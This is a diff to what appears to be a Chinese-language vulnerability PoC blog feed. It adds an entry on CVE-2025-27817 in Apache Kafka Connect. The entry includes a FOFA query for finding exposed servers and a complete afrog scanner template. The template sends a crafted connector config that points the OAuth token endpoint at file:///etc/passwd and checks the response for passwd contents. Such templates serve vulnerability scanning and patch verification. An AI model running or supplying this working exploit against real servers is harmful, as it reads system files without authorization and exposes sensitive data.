@@ -4,6 +4,33 @@
   
   
   <entry>
+    <title>Apache Kafka 客户端任意文件读取</title>
+    <link href="/2025/06/13/github_3995898632/"/>
+    <url>/2025/06/13/github_3995898632/</url>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Apache Kafka 客户端任意文件读取</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-27817</li></ul><p><strong>漏洞类型：</strong> 文件读取</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 允许未经身份验证的攻击者利用该漏洞实现任意文件读取，大多数据处理中间件或流式处理框架，如：Apache Spark Structured Streaming、Apache Druid等在应用中需要调用Kafka Connect组件，而这些服务会存储大量的核心业务系统敏感数据，一旦被攻击将造成更加严重的数据泄密。</p><p><strong>产品厂商：</strong> Apache</p><p><strong>产品名称：</strong> Apache Kafka</p><p><strong>搜索语法：</strong> header&#x3D;”Jetty” &amp;&amp; body&#x3D;”kafka_cluster_id”</p><p><strong>来源：</strong> <a href="https://github.com/zan8in/afrog/blob/7f99672b4240e351572d36eab24f17bcc7fbb3a5/pocs%2Ftemp%2Fafrog-pocs%2Fcve%2FCVE-2025-27817.yaml">https://github.com/zan8in/afrog/blob/7f99672b4240e351572d36eab24f17bcc7fbb3a5/pocs%2Ftemp%2Fafrog-pocs%2Fcve%2FCVE-2025-27817.yaml</a></p><p><strong>类型：</strong> zan8in&#x2F;afrog:github commit</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>5-<span class="hljs-number">27817</span><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Apache Kafka 客户端任意文件读取<br>  <span class="hljs-params">author:</span> avic123<br>  <span class="hljs-params">severity:</span> high<br>  <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-params">description:</span> |<br>    允许未经身份验证的攻击者利用该漏洞实现任意文件读取，大多数据处理中间件或流式处理框架，如：Apache Spark Structured Streaming、Apache Druid等在应用中需要调用Kafka Connect组件，而这些服务会存储大量的核心业务系统敏感数据，一旦被攻击将造成更加严重的数据泄密。<br>    fofa:header<span class="hljs-operator">=</span><span class="hljs-string">&quot;Jetty&quot;</span> <span class="hljs-operator">&amp;&amp;</span> body<span class="hljs-operator">=</span><span class="hljs-string">&quot;kafka_cluster_id&quot;</span><br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//mp.weixin.qq.com/s/z7Ppzv1k8flAXZiLQo9SSw</span><br>  <span class="hljs-params">created:</span> <span class="hljs-number">2025</span><span class="hljs-symbol">/06/13</span><br><br><span class="hljs-params">rules:</span><br>  <span class="hljs-params">r0:</span><br>    <span class="hljs-params">request:</span><br>      <span class="hljs-params">method:</span> POST<br>      <span class="hljs-params">path:</span> <span class="hljs-symbol">/connectors</span><br>      <span class="hljs-params">headers:</span><br>        <span class="hljs-params">Content-Type:</span> <span class="hljs-symbol">/application/json</span><br>      <span class="hljs-params">body:</span> |<br>        &#123;<br>          <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;malicious-connector&quot;</span>,<br>          <span class="hljs-string">&quot;config&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;connector.class&quot;</span>: <span class="hljs-string">&quot;org.apache.kafka.connect.mirror.MirrorHeartbeatConnector&quot;</span>,<br>            <span class="hljs-string">&quot;tasks.max&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>            <span class="hljs-string">&quot;source.cluster.alias&quot;</span>: <span class="hljs-string">&quot;source-0&quot;</span>,<br>            <span class="hljs-string">&quot;target.cluster.alias&quot;</span>: <span class="hljs-string">&quot;target-0&quot;</span>,<br>            <span class="hljs-string">&quot;source.cluster.bootstrap.servers&quot;</span>: <span class="hljs-string">&quot;127.0.0.1:9092&quot;</span>,<br>            <span class="hljs-string">&quot;target.cluster.bootstrap.servers&quot;</span>: <span class="hljs-string">&quot;127.0.0.1:9092&quot;</span>,<br>            <span class="hljs-string">&quot;producer.override.sasl.oauthbearer.token.endpoint.url&quot;</span>: <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>,<br>            <span class="hljs-string">&quot;producer.override.sasl.login.callback.handler.class&quot;</span>: <span class="hljs-string">&quot;org.apache.kafka.common.security.oauthbearer.OAuthBearerLoginCallbackHandler&quot;</span>,<br>            <span class="hljs-string">&quot;producer.override.sasl.jaas.config&quot;</span>: <span class="hljs-string">&quot;org.apache.kafka.common.security.oauthbearer.OAuthBearerLoginModule required serviceName=<span class="hljs-char escape_">\&quot;</span>exploit<span class="hljs-char escape_">\&quot;</span>;&quot;</span>,<br>            <span class="hljs-string">&quot;producer.override.sasl.mechanism&quot;</span>: <span class="hljs-string">&quot;OAUTHBEARER&quot;</span>,<br>            <span class="hljs-string">&quot;value.converter&quot;</span>: <span class="hljs-string">&quot;org.apache.kafka.connect.converters.ByteArrayConverter&quot;</span>,<br>            <span class="hljs-string">&quot;key.converter&quot;</span>: <span class="hljs-string">&quot;org.apache.kafka.connect.converters.ByteArrayConverter&quot;</span><br>          &#125;<br>        &#125;<br>    <span class="hljs-params">expression:</span> <span class="hljs-operator">&gt;</span><span class="hljs-operator">-</span><br>      response.status <span class="hljs-operator">==</span> <span class="hljs-number">200</span> <span class="hljs-operator">&amp;&amp;</span> <span class="hljs-string">&quot;root:.*?:[0-9]*:[0-9]*:&quot;</span>.bmatches(response.body)<br><br><span class="hljs-params">expression:</span> r0()<br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>文件读取</tag>
+      
+      <tag>zan8in/afrog:github commit</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Cisco IOS Smart Install Buffer Overflow Vulnerability</title>
     <link href="/2025/06/13/github_1567481502/"/>
     <url>/2025/06/13/github_1567481502/</url>
@@ -13842,9 +13869,9 @@
     
     <tags>
       
-      <tag>跨站可执行脚本</tag>
-      
       <tag>CVE-2024:github search</tag>
+      
+      <tag>跨站可执行脚本</tag>
       
     </tags>
     
